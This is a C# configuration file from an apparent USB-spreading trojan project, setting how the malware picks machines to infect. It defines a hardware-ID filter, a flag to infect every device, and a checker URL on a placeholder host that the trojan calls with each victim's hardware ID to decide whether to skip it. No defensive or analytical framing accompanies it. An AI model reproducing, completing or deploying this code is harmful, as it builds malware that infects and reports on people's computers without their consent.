using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace USBTrojan
{
    class Config
    {
        // * HWID Settings

        // If false trojan will infect all devices.
        public const bool HWIDEnabled = true;

        // Save calculated HWID to local storage
        public const bool HWIDCacheEnabled = false;

        // HWID list or checker URL
        public const string HWIDListURL = "https://example.com/USBTrojan/hwid/isInWhitelist?hwid={0}";

        // verification mode
        // 0 - download HWID blacklist (ignored computers) seperated with '\n'
        //     good for static pages
        // 1 - send a request to the server and handle response
        //     if response is 'good' trojan will skip machine
        public const int HWIDMode = 1;
    }
}
